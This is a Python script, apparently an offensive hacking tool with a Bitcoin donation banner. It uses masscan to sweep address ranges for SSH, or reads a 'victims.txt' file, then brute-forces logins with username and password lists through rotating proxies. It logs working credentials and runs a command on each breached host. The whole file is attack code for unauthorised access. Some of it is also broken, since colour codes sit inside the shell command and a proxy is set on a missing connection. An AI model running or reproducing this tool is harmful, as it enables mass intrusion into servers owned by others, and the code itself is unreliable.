import paramiko
import concurrent.futures
from colorama import Fore, Style
import subprocess
import time

def generate_ip_addresses(ip_class):
    # Generate all possible IP addresses within the specified class
    ip_addresses = []
    for i in range(1, 256):
        for j in range(1, 256):
            ip_addresses.append(f"{ip_class}.{i}.{j}")
    return ip_addresses

def print_banner():
    # Print a colorful banner with support information
    banner = (
        f"{Fore.CYAN}{Style.BRIGHT}Don't worry if you see 'request timed out' when bruteforcing,\n"
        "it means the victim server either blocked your IP, it's offline, or the proxy you are using is offline.{Fore.RESET}"
        f"\n\n{Fore.CYAN}{Style.BRIGHT}Tool{Style.RESET_ALL} {Fore.MAGENTA}{Style.BRIGHT}created{Style.RESET_ALL} {Fore.GREEN}{Style.BRIGHT}by{Style.RESET_ALL} {Fore.YELLOW}{Style.BRIGHT}HASHIRA_HAX\n"
        f"{Fore.RED}Support{Style.RESET_ALL} {Fore.MAGENTA}{Style.BRIGHT}me{Style.RESET_ALL} {Fore.CYAN}{Style.BRIGHT}at:{Style.RESET_ALL}\n"
        f"Bitcoin: {Fore.YELLOW}bc1qgu429cxlvkp35jwau9jjrw6yd3gepywhptcl8c{Style.RESET_ALL}"
    )
    print(banner)

def auto_scan_and_bruteforce(ip_class, username_list, password_list, use_proxies=False, proxy_list=None):
    print_banner()
    
    # Prompt user to choose the mode
    mode = input(f"{Fore.BLUE}{Style.BRIGHT}Choose the mode (1: Scan for IPs using masscan, 2: Use IPs from victims.txt): {Style.RESET_ALL}")

    if mode == "1":
        ip_range = f"{ip_class}.0.0/8"
        # Masscan command to scan for IPs on port 22 within the specified range
        masscan_command = f"{Fore.GREEN}{Style.BRIGHT}masscan{Style.RESET_ALL} {ip_range} {Fore.RED}-p22{Style.RESET_ALL} {Fore.CYAN}--open{Style.RESET_ALL} {Fore.MAGENTA}--rate=10000{Style.RESET_ALL} {Fore.YELLOW}-oG{Style.RESET_ALL} {Fore.WHITE}masscan_output.txt{Style.RESET_ALL}"
        subprocess.run(masscan_command, shell=True)

        # Parse Masscan output file to get new IPs
        new_ips = get_new_ips("masscan_output.txt")
        
        if new_ips:
            ssh_bruteforce(new_ips, username_list, password_list, use_proxies, proxy_list)
        else:
            print(f"\n{Fore.YELLOW}[INFO]{Style.RESET_ALL} {Fore.WHITE}No new IPs found.{Style.RESET_ALL}")

    elif mode == "2":
        # Read IPs from victims.txt
        with open("victims.txt", 'r') as file:
            victim_ips = [line.strip() for line in file.readlines()]

        ssh_bruteforce(victim_ips, username_list, password_list, use_proxies, proxy_list)

    else:
        print(f"{Fore.RED}Invalid mode. Exiting...{Style.RESET_ALL}")

def get_new_ips(output_file):
    # Parse Masscan output file to get new IPs
    new_ips = []
    with open(output_file, 'r') as file:
        for line in file:
            if line.startswith('Host:'):
                ip = line.split()[1]
                new_ips.append(ip)
    return new_ips

def ssh_bruteforce(target_ip, username_list, password_list, use_proxies=False, proxy_list=None):
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for ip in target_ip:
            ip = ip.strip()
            print(f"\n{Fore.GREEN}[INFO]{Style.RESET_ALL} {Fore.WHITE}Testing{Style.RESET_ALL} {Fore.CYAN}IP:{Style.RESET_ALL} {ip}")
            for username in username_list:
                for password in password_list:
                    # Submit a thread for each combination of IP, username, password, and proxy
                    futures.append(
                        executor.submit(
                            try_ssh_connection, ip, username, password, use_proxies, proxy_list
                        )
                    )

        # Wait for all threads to complete
        concurrent.futures.wait(futures)

def try_ssh_connection(ip, username, password, use_proxies=False, proxy_list=None):
    try:
        # Create an SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Set proxy if provided and use_proxies is True
        proxy = None
        if use_proxies and proxy_list:
            proxy = proxy_list.pop(0)
            client.get_transport().set_proxy(proxy)

        # Attempt to connect using the current credentials
        # Increase the timeout value to handle potential delays
        client.connect(ip, port=22, username=username, password=password, timeout=15)

        # If successful, execute uname -a and print the result
        print(f"{Fore.GREEN}Successful{Style.RESET_ALL} {Fore.CYAN}login{Style.RESET_ALL} - {Fore.CYAN}IP:{Style.RESET_ALL} {ip}, {Fore.GREEN}Username:{Style.RESET_ALL} {username}, {Fore.RED}Password:{Style.RESET_ALL} {password}")
        with open("success.txt", "a") as success_file:
            success_file.write(f"IP: {ip}, Username: {username}, Password: {password}\n")

        stdin, stdout, stderr = client.exec_command("uname -a")
        print(f"{Fore.CYAN}Command Output:{Style.RESET_ALL}\n{stdout.read().decode('utf-8')}")

    except paramiko.AuthenticationException:
        # Incorrect credentials, continue to the next ones
        print(f"{Fore.RED}Failed{Style.RESET_ALL} {Fore.CYAN}login{Style.RESET_ALL} - {Fore.CYAN}IP:{Style.RESET_ALL} {ip}, {Fore.GREEN}Username:{Style.RESET_ALL} {username}, {Fore.RED}Password:{Style.RESET_ALL} {password}")

    except Exception as e:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} {e}")

    finally:
        # Close the SSH connection
        client.close()

        # Return the used proxy to the list
        if use_proxies and proxy_list and proxy:
            proxy_list.append(proxy)
            # Add a sleep interval of 5 seconds between changing proxies
            time.sleep(5)

        # Add a sleep interval of 5 seconds between each password attempt
        time.sleep(5)

if __name__ == "__main__":
    # Get user input for IP class to scan
    ip_class = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the IP class to scan (e.g., 123.57): {Style.RESET_ALL}")

    # Read the list of usernames from a file
    username_list_file = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the path to the username list file (e.g., users.txt): {Style.RESET_ALL}")

    with open(username_list_file, 'r') as file:
        username_list = [line.strip() for line in file.readlines()]

    # Use a list of passwords for testing (replace with your password list)
    password_list_file = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the path to the password list file (e.g., pass.txt): {Style.RESET_ALL}")

    with open(password_list_file, 'r') as file:
        password_list = [line.strip() for line in file.readlines()]

    # Read the list of proxies from a file if using proxies
    use_proxies = input(f"{Fore.BLUE}{Style.BRIGHT}Do you want to use proxies? (y/n): {Style.RESET_ALL}").lower() == 'y'
    proxy_list = []
    if use_proxies:
        proxy_list_file = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the path to the proxy list file (e.g., proxy.txt): {Style.RESET_ALL}")

        with open(proxy_list_file, 'r') as file:
            proxy_list = [line.strip() for line in file.readlines()]

    auto_scan_and_bruteforce(ip_class, username_list, password_list, use_proxies, proxy_list)
